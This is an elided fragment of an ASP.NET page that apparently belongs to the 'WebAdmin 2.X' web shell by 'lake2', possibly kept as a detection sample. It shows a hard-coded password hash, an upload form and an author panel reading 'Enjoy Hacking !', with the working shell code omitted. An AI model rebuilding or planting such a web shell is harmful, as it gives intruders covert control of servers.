...
<script runat="server">
    ...
    Const PASSWORD as string = "0fcecfdf9bfd5e076009e16cd2ae5bf7"
...
<body>
    <form method="post" enctype="multipart/form-data" runat="server">
        ...
        <asp:Panel id="about" runat="server" Wrap="False" ToolTip="about WebAdmin 2.X Final" Visible="False" Width="789px" Height="25px" HorizontalAlign="Center">
            ...
            <asp:HyperLink id="HyperLink1" runat="server" Visible="True" Target="_blank" NavigateUrl="http://lake2.0x54.org">lake2</asp:HyperLink>
            <br />
            <asp:Image id="Image1" runat="server" ToolTip="Build20051225" Visible="True" ImageUrl="http://www.0x54.org/lake2/image/webadmin.gif" AlternateText="Enjoy Hacking !"></asp:Image>
        </asp:Panel>
